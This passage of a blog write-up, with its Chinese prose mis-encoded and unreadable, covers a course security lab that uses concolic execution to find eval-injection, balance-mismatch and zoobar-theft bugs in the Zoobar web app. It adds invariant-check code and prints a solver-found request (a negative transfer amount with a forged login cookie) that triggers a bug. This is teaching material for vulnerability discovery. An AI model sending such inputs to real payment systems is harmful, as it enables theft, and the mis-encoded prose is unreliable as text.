class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py | grep <span class="hljs-string">&quot;Exception: eval injection&quot;</span></span><br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼Œå‘ç°äº†ä¸¤ä¸ª eval injectionï¼š</p><p><img src="https://s2.loli.net/2022/12/21/YslcqeuVP2C6Ni7.png" alt="image.png"></p><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹  <code>symex/symeval.py</code>  çš„å†…éƒ¨é€»è¾‘ï¼Œå…¶é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯ç»™å†…ç½®çš„ <code>eval()</code> å¥—äº†ä¸€å±‚ wrapperï¼Œæ£€æŸ¥å‚æ•°æ˜¯å¦å¸¦æœ‰  <code>;badstuff();</code> å­—ç¬¦ä¸²ï¼Œè‹¥æ˜¯åˆ™ç›´æ¥æŠ›å¼‚å¸¸ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">real_eval = builtins.<span class="hljs-built_in">eval</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myeval</span>(<span class="hljs-params">expr, <span class="hljs-built_in">globals</span> = <span class="hljs-literal">None</span>, <span class="hljs-built_in">locals</span> = <span class="hljs-literal">None</span></span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;;badstuff();&#x27;</span> <span class="hljs-keyword">in</span> expr:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;eval injection&quot;</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">locals</span> = <span class="hljs-built_in">globals</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    frame = inspect.currentframe()<br>    <span class="hljs-keyword">try</span>:<br>      <span class="hljs-built_in">locals</span> = frame.f_back.f_locals<br>      <span class="hljs-built_in">globals</span> = frame.f_back.f_globals<br>    <span class="hljs-keyword">finally</span>:<br>      <span class="hljs-keyword">del</span> frame<br><br>  <span class="hljs-comment">## Try to evaluate the expression as an integer</span><br>  v = str_to_small_int(expr)<br>  <span class="hljs-keyword">if</span> v <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> v<br><br>  <span class="hljs-keyword">return</span> real_eval(expr, <span class="hljs-built_in">globals</span>, <span class="hljs-built_in">locals</span>)<br>builtins.<span class="hljs-built_in">eval</span> = myeval<br></code></pre></td></tr></table></figure><p>è€Œåœ¨ <code>check-symex-zoobar.py</code> å½“ä¸­ï¼Œåº”ç”¨äº†æ··åˆæ‰§è¡Œæ¡†æ¶çš„ä¸º <code>test_stuff()</code> å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">fuzzy.concolic_execs(test_stuff, maxiter=<span class="hljs-number">500</span>, verbose=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æš‚ä¸”å…ˆä¸å…³æ³¨ Zoobar çš„å®ç°ä¸ºä½•ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä½•ä½¿ç”¨æˆ‘ä»¬çš„æ··åˆæ‰§è¡Œç³»ç»Ÿæ¥å¯»æ‰¾å…¶ä¸­çš„æ¼æ´ï¼Œåœ¨ <code>test_stuff()</code> ä¸­å®é™…ä¸Šæ˜¯é€šè¿‡å°†éƒ¨åˆ†å‚æ•°è®¾ç½®ä¸ºæ··åˆå€¼æ¥è¿›è¡Œæ··åˆæ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  <span class="hljs-comment"># Zoobaråˆå§‹åŒ–å·¥ä½œ</span><br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  <span class="hljs-comment">##...</span><br><br>  <span class="hljs-comment">## è®¾ç½®ç¯å¢ƒå˜é‡</span><br>  environ = &#123;&#125;<br>  <span class="hljs-comment">##...</span><br>  environ[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;referrer&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>  environ[<span class="hljs-string">&#x27;HTTP_COOKIE&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;cookie&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å®ç°ä¸¤ç§é¢å¤–çš„ä¸å˜é‡æ£€æŸ¥ä»¥æ£€æŸ¥ Zoobar æ˜¯å¦å­˜åœ¨å…¶ä»–æ¼æ´ï¼š</p><ul><li>è‹¥æ²¡æœ‰æ–°ç”¨æˆ·è¢«æ³¨å†Œï¼Œåˆ™æ‰€æœ‰ç”¨æˆ·çš„ Zoobar balances ä¹‹å’Œåº”å½“åœ¨æ¯æ¬¡è¯·æ±‚é—´ä¿æŒä¸€è‡´</li><li>è‹¥ç”¨æˆ· <code>u</code> æ²¡æœ‰å‘ Zoobar è¿›è¡Œè¯·æ±‚ï¼Œ<code>u</code> çš„ Zoobar balance ä¸åº”å½“ç¼©å°</li></ul><p>äºæ˜¯æ¥åˆ° Exercise 9ï¼Œå‘  <code>check-symex-zoobar.py</code> ä¸­æ·»åŠ ç›¸åº”çš„ä¸å˜é‡æ£€æŸ¥ï¼š</p><blockquote><p><strong>Exercise 9.</strong> Add invariant checks to <code>check-symex-zoobar.py</code> to implement the above two rules (total balance preservation and no zoobar theft). Look for the comment <code>Exercise 9: your code here</code> to see where you should write this code. When you detect a zoobar balance mismatch, call the <code>report_balance_mismatch()</code> function. When you detect zoobar theft, call <code>report_zoobar_theft()</code>.</p><p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p><p>To check whether your solution works correctly, you need to re-run <strong>.&#x2F;check-symex-zoobar.py</strong> and see whether the output contains the messages <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you (run <code>check-symex-zoobar.py</code> and look for these magic strings).</p></blockquote><p>åœ¨ Zoobar ä¸­å®é™…ä¸Šæ˜¯é€šè¿‡ <code>zoobar.app()</code> æ¥å®Œæˆ HTTP è¯·æ±‚çš„è§£æå®ç°ï¼Œå› æ­¤åœ¨  <code>test_stuff()</code>  ä¸­é€‰æ‹©ç›´æ¥æ„é€ è¯·æ±‚ï¼ˆ<code>environ</code> å­—å…¸ï¼‰ä¼ é€’ç»™è¯¥å‡½æ•°æ¥æ¨¡æ‹Ÿå‘ Zoobar å‘é€ HTTP è¯·æ±‚çš„è¿‡ç¨‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">environ = &#123;&#125;<br><span class="hljs-comment">##...</span><br>environ[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] = <span class="hljs-string">&#x27;GET&#x27;</span><br>environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>] = <span class="hljs-string">&#x27;trans&#x27;</span> + fuzzy.mk_str(<span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">if</span> environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].startswith(<span class="hljs-string">&#x27;//&#x27;</span>):<br>  <span class="hljs-comment">## Don&#x27;t bother trying to construct paths with lots of slashes;</span><br>  <span class="hljs-comment">## otherwise, the lstrip() code generates lots of paths..</span><br>  <span class="hljs-keyword">return</span><br><br>resp = zoobar.app(environ, startresp)<br><span class="hljs-keyword">if</span> verbose:<br>  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> resp:<br>    <span class="hljs-built_in">print</span>(x)<br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯¹ä»£ç çš„æ£€æŸ¥åˆ™æ˜¯åœ¨è¯·æ±‚å®Œæˆåè¿›è¡Œçš„ï¼Œé¦–å…ˆæ˜¯å¯¹ balance çš„æ£€æŸ¥ï¼Œè¿™é‡Œä¸äº†è§£ Zoobar çš„ç›¸å…³ç»“æ„ï¼ˆæˆ–è€…æ²¡æ¥å¾—åŠ<del>&#x2F;æ‡’å¾—</del>çœ‹ï¼‰ä¹Ÿä¸è¦ç´§ï¼Œåœ¨ <code>test_stuff()</code> çš„å¼€å¤´æœ‰è¿™æ ·çš„è®¡ç®— balances æ€»å’Œçš„é€»è¾‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  <span class="hljs-comment"># è®¡ç®— balance æ€»å’Œ</span><br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br></code></pre></td></tr></table></figure><p>å¯¹äºå•ä¸ªç”¨æˆ·è€Œè¨€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>person.zoobars</code> è·å–å…¶ balanceï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>pdb.query(zoobar.zoodb.Person).all()</code> è·å–ç”¨æˆ·å¯¹è±¡åˆ—è¡¨ ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨è¯·æ±‚ç»“æŸåä½¿ç”¨åŒæ ·çš„é€»è¾‘è®¡ç®—å½“å‰çš„ balanceï¼Œå¹¶ä¸åŸ balance å¯¹æ¯”å³å¯ï¼Œè‹¥ä¸ä¸€è‡´åˆ™æŒ‰æ‰‹å†Œè¯´æ˜è°ƒç”¨ <code>report_balance_mismatch()</code> å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 9: your code here.</span><br><br><span class="hljs-comment">## Detect balance mismatch.</span><br><span class="hljs-comment">## When detected, call report_balance_mismatch()</span><br>balance2 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br><span class="hljs-keyword">if</span> balance1 != balance2:<br>  report_balance_mismatch()<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯ç¬¬äºŒä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ²¡æœ‰è¿›è¡Œæ“ä½œä½†æ˜¯ balance ç¼©å°äº†çš„ç”¨æˆ·ï¼ˆå³å‘ç”Ÿè½¬å‡ºï¼‰ï¼Œç”±äºåœ¨æµ‹è¯•å‡½æ•°ä¸­ä»…è¿›è¡Œäº†ä¸€æ¬¡æ“ä½œï¼Œæ•…æœªè¿›è¡Œæ“ä½œçš„ç”¨æˆ·çš„ balance <strong>ä¸åº”å½“å°äºåˆå§‹å€¼</strong>ï¼ˆä½†æ˜¯å¯ä»¥å¤§äºï¼Œå› ä¸ºå¯ä»¥æœ‰åˆ«çš„è´¦æˆ·å‘å…¶è¿›è¡Œè½¬å…¥ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€ä¸ªç”¨æˆ·çš„åˆå§‹ä¿¡æ¯</p><p>åœ¨ <code>test_stuff()</code> å¼€å¤´ä¾¿å¯¹åº”åˆ›å»ºäº†ä¸¤ä¸ªæ•°æ®åº“ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä»å…¶å®šä¹‰å…¥æ‰‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br>  pdb.commit()<br><br>  tdb = zoobar.zoodb.transfer_setup()<br>  tdb.query(zoobar.zoodb.Transfer).delete()<br>  tdb.commit()<br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>zoobar/zoodb.py</code> ä¸­å®šä¹‰äº† Person æ•°æ®åº“ï¼Œå…¶ä¸­ balanceï¼ˆä¹Ÿå°±æ˜¯ zoobars å­—æ®µï¼‰çš„åˆå§‹å€¼ä¸º 10ï¼ŒåŒæ—¶ä¸»é”®ä¸º <code>username</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">PersonBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;person&quot;</span><br>    username = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    password = Column(String(<span class="hljs-number">128</span>))<br>    token = Column(String(<span class="hljs-number">128</span>))<br>    zoobars = Column(Integer, nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-number">10</span>)<br>    profile = Column(String(<span class="hljs-number">5000</span>), nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>åœ¨è¯¥æ–‡ä»¶ä¸­è¿˜å®šä¹‰äº† Transfer æ•°æ®åº“ï¼Œåº”å½“ç”¨ä»¥è¡¨ç¤ºå•æ¬¡äº¤æ˜“çš„åŒæ–¹åŠæ•°å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transfer</span>(<span class="hljs-title class_ inherited__">TransferBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;transfer&quot;</span><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)<br>    sender = Column(String(<span class="hljs-number">128</span>))<br>    recipient = Column(String(<span class="hljs-number">128</span>))<br>    amount = Column(Integer)<br>    time = Column(String)<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥éå† Person æ•°æ®åº“ä»¥è·å¾—æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åé›†åˆï¼Œæ¥ä¸‹æ¥éå† Transfer æ•°æ®åº“æ¥å°†ç”¨æˆ·åé›†åˆä¸­çš„é sender ç»™å‰”é™¤ï¼ˆå› ä¸ºæˆ‘ä»¬ä¸»è¦å…³æ³¨ recipient å‘ç”Ÿäº† balance ç¼©å°çš„æƒ…å†µï¼‰ï¼Œæœ€åæ£€æŸ¥å‰©ä½™ç”¨æˆ·æ˜¯å¦å­˜åœ¨ balance å°äºåˆå§‹å€¼çš„æƒ…å†µï¼Œè‹¥æ˜¯åˆ™è¯´æ˜å­˜åœ¨æ¼æ´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Detect zoobar theft.</span><br><span class="hljs-comment">## When detected, call report_zoobar_theft()</span><br>udict = &#123;&#125;<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>():<br>  udict[p.username] = p<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tdb.query(zoobar.zoodb.Transfer).<span class="hljs-built_in">all</span>():<br>  udict.pop(t.sender)<br><span class="hljs-keyword">for</span> username <span class="hljs-keyword">in</span> udict.keys():<br>  <span class="hljs-keyword">if</span> udict[username].zoobars &lt; <span class="hljs-number">10</span>:<br>    report_zoobar_theft()<br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡ Exercise 9ï¼š</p><p><img src="https://s2.loli.net/2022/12/24/FnSvPHRsQbc6LZT.png" alt="image.png"></p><p>æœ€åæ˜¯ Exercise 10ï¼Œä¿®å¤ balance mismatch å’Œ zoobar theft è¿™ä¸¤ä¸ªæ¼æ´ï¼ˆLab å·²ç»æ›¿æˆ‘ä»¬ä¿®å¥½äº† eval injection çš„æ¼æ´ï¼‰ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œè¯„æµ‹ç³»ç»Ÿè¦æ±‚å°†å­˜åœ¨é—®é¢˜çš„æºç æ–‡ä»¶æ‹·è´åˆ° <code>zoobar-fixed</code> ä¸‹å†è¿›è¡Œä¿®å¤ï¼Œï¼š</p><blockquote><p><strong>Exercise 10.</strong> Fix the two bugs you found in Exercise 9, by copying whatever <code>.py</code> files you need to modify from the <code>zoobar</code> directory to <code>zoobar-fixed</code> and changing them there.</p><p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p><p>To check whether your solution works correctly, you need to run <strong>.&#x2F;check-symex-zoobar-fixed.sh</strong> and see whether the output still contains the messages <code>Exception: eval injection</code>, <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you.</p></blockquote><p>é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆè¦æ‰¾åˆ°æ¼æ´å‡ºç°çš„ä½ç½®ï¼Œç¬”è€…æœ€åˆçš„æ€è·¯æ˜¯åœ¨ä¸¤ä¸ªæ‰¾åˆ°æ¼æ´çš„ report å‡½æ•°è¿›è¡Œçº¦æŸæ±‚è§£å°±å¯ä»¥è·å¾—é€ æˆé—®é¢˜çš„è¾“å…¥ï¼Œä½†æ˜¯<strong>è¿™ä¸ªåšæ³•å¹¶ä¸å¯è¡Œï¼Œå› ä¸ºæœ¬ Lab æä¾›çš„æ··åˆæ‰§è¡Œæ¡†æ¶æ˜¯é«˜åº¦å°è£…å¥½çš„</strong>ï¼Œåœ¨ <code>concolic_execs()</code> çš„æ‰§è¡Œè¿‡ç¨‹ä¸­æˆ‘ä»¬æ˜¯æ²¡åŠæ³•ä¸­é€”åœä¸‹æ¥è¿›è¡Œçº¦æŸæ±‚è§£çš„</p><blockquote><p>ç¬”è€…æ€è€ƒäº†åŠå¤©æ€ä¹ˆæ”¹æ‰èƒ½åœ¨ <code>test_stuff()</code> çš„ä¸¤ä¸ª report() å‡½æ•°è¿›è¡Œçº¦æŸæ±‚è§£æ¥å¾—åˆ°è§¦å‘æ¼æ´çš„è¾“å…¥ï¼Œåé¢å‘ç°åŸºæœ¬æ²¡å•¥å¯è¡Œæ€§ï¼Œå®åœ¨è¦å¼„çš„è¯éœ€è¦å¯¹æ•´ä¸ªæ¡†æ¶è¿›è¡Œå¤§æ”¹ï¼Œæ•…å°±æ­¤ä½œç½¢æ”¹æ¢æ€è·¯â€¦</p></blockquote><p>æˆ‘ä»¬é‡æ–°æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼š  <em>Lab 3 ä¸ºä»€ä¹ˆæä¾›çš„æ˜¯æ··åˆæ‰§è¡Œæ¡†æ¶è€Œéçº¯ç¬¦å·æ‰§è¡Œæˆ–æ˜¯çº¯å…·ä½“æ‰§è¡Œå‘¢ï¼Ÿ</em>  </p><p>æ­£å¦‚å‰æ–‡æ‰€è¨€ï¼Œconcolic execution çš„è¯ç”Ÿä¾¿æ˜¯ä¸ºäº†è§£å†³ symbolic execution ä¸ concrete execution æ‰€åˆ†åˆ«å­˜åœ¨çš„é—®é¢˜ï¼Œèåˆä¸¤è€…çš„ç‰¹æ€§æ¥è¾¾åˆ°ä¸€ä¸ªæ›´å¥½çš„æ•ˆæœ</p><p>ç°åœ¨è®©æˆ‘ä»¬é‡æ–°å®¡è§† <code>concolic_execs()</code> çš„æ‰§è¡Œæµç¨‹ï¼š</p><ul><li>ç”±ä¸€ä¸ªå¤–å±‚å¤§å¾ªç¯ä¸æ–­è¿­ä»£<ul><li>ä»è¾“å…¥é˜Ÿåˆ—ä¸­å–å‡ºå…·ä½“å€¼å­—å…¸</li><li>è°ƒç”¨ <code>concolic_exec_input()</code> æ‰§è¡Œç›®æ ‡å‡½æ•°ï¼Œè·å–åˆ°è¿”å›å€¼ã€åˆ†æ”¯æ¡ä»¶åˆ—è¡¨ã€åˆ†æ”¯è°ƒç”¨æ–¹åˆ—è¡¨</li><li>å°†å¾—åˆ°çš„æ–°çš„è¿”å›å€¼æ·»åŠ è‡³ <code>outs</code> é›†åˆ</li><li>å†…å±‚å°å¾ªç¯éå†åˆ†æ”¯æ¡ä»¶åˆ—è¡¨<ul><li>è°ƒç”¨ <code>concolic_force_branch()</code> è·å–å°†å½“å‰åˆ†æ”¯æ¡ä»¶é€†è½¬åçš„çº¦æŸæ¡ä»¶</li><li>è‹¥è¯¥çº¦æŸä¸åœ¨ <code>checked</code> ï¼ˆå·²éªŒè¯çº¦æŸé›†åˆï¼‰ä¸­ï¼Œæ·»åŠ ï¼Œå¹¶è°ƒç”¨ <code>concolic_find_input()</code> è¿›è¡Œçº¦æŸæ±‚è§£</li><li>çº¦æŸå¯è§£ï¼Œå°†ç»“æœæ·»åŠ åˆ°ä¸‹ä¸€æ¬¡ä½œä¸ºè¾“å…¥çš„å…·ä½“å€¼å­—å…¸ä¸­</li></ul></li></ul></li></ul><p>æˆ‘ä»¬ä¸éš¾å¾—çŸ¥çš„æ˜¯ï¼Œå½“ <code>test_stuff()</code> æŠ¥å‘Šæ¼æ´æ—¶ï¼Œ<strong>è¯´æ˜æˆ‘ä»¬çš„ concolic execution system ç»™å‡ºäº†ä¸€ä¸ªèƒ½å¤Ÿè§¦å‘æ¼æ´çš„ concrete input</strong></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹è¯­å¥æ¥å°†è¾“å‡ºé‡å®šå‘è‡³å½“å‰ç›®å½•ä¸‹çš„ <code>typescript</code> æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure><p>å‰é¢æˆ‘ä»¬ç”¨åˆ°çš„ä¸¤ä¸ª report() å‡½æ•°å®é™…ä¸Šå°±åªæ˜¯ <code>print()</code> è€Œå·²ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è¾“å‡ºç»“æœä¸­æœç´¢å¯¹åº”çš„å­—ç¬¦ä¸²å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_balance_mismatch</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Balance mismatch detected&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_zoobar_theft</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Zoobar theft detected&quot;</span>)<br></code></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯ä¸¤ä¸ªä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;-10&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1689</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css...</span><br><span class="hljs-string"># responseï¼Œæ¯”è¾ƒé•¿ä¸”æ— æ„ä¹‰ï¼Œè¿™é‡Œæš‚ä¸”çœç•¥</span><br><span class="hljs-string">WARNING: Balance mismatch detected</span><br><span 